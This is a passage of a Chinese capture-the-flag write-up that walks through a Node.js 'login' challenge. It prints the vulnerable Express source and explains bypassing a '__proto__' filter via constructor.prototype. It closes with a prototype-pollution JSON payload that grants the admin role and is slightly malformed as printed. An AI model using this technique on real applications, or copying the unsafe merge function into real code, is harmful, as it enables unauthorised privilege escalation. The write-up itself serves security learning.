class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> &#x27;<span class="symbol">type</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">async_generator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">int</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">bytearray_iterator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">bytearray</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">bytes_iterator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">bytes</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">builtin_function_or_method</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">callable_iterator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">PyCapsule</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">cell</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">classmethod_descriptor</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">classmethod</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">code</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">complex</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">coroutine</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">dict_items</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">dict_itemiterator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">dict_keyiterator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">dict_valueiterator</span>&#x27;&gt;</span><br></pre></td></tr></table></figure><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>扫描目录发现有个&#x2F;src路由，访问可得源码</p><p>题目源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line"><span class="attr">secret</span>: crypto.<span class="title function_">randomBytes</span>(<span class="number">64</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>),</span><br><span class="line"><span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">saveUninitialized</span>: <span class="literal">true</span></span><br><span class="line">&#125;))</span><br><span class="line"><span class="keyword">var</span> users = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> admins = &#123;&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;<span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line"><span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line"><span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">target[key] = source[key]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkLogin</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">user</span>) &#123;</span><br><span class="line">res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_">next</span>()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>) &#123;</span><br><span class="line"><span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[key]</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, checkLogin, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;user&#x27;</span>: req.<span class="property">session</span>.<span class="property">user</span>,</span><br><span class="line"><span class="string">&#x27;role&#x27;</span>: req.<span class="property">session</span>.<span class="property">role</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/login.html&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/src&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;app.js&#x27;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, checkLogin, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="title function_">destroy</span>()</span><br><span class="line">res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, checkLogin, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> flag = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;This is your flag: &#x27;</span> + flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">let</span> msg = <span class="string">&#x27;Your role is not admin&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> &#123; username, password &#125; = <span class="title function_">merge</span>(&#123;&#125;, req.<span class="property">body</span>)</span><br><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> users === <span class="literal">false</span>)&#123;</span><br><span class="line">users[username] = password</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (password === users[username]) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">user</span> = username</span><br><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> admins) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login success&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login failed&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">5000</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listen on 5000&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>发现函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line"><span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line"><span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">target[key] = source[key]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>确定是原型链污染</p><p>过滤了 <strong>proto</strong> ，可以用 constructor.prototype 来代替，分析源码可得当 req.session.role 是 admin 的时候，访问 &#x2F;flag 即可得到flag</p><p>看下login路由</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> &#123; username, password &#125; = <span class="title function_">merge</span>(&#123;&#125;, req.<span class="property">body</span>)</span><br><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> users === <span class="literal">false</span>)&#123;</span><br><span class="line">users[username] = password</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (password === users[username]) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">user</span> = username</span><br><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> admins) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login success&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login failed&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>只要我们的登录的用户名在admins字典中，访问&#x2F;flag就可以得到flag</p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="string">&quot;constructor&quot;</span><span class="string">&quot;&#123;</span></span><br><span class="line"><span class="string">   &quot;</span>prototype<span class="string">&quot;:&#123;</span></span><br><span class="line"><span class="string">      &quot;</span>test<span class="string">&quot;: &quot;</span><span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829162203071.png" alt="image-20240829162203071"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SRCTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
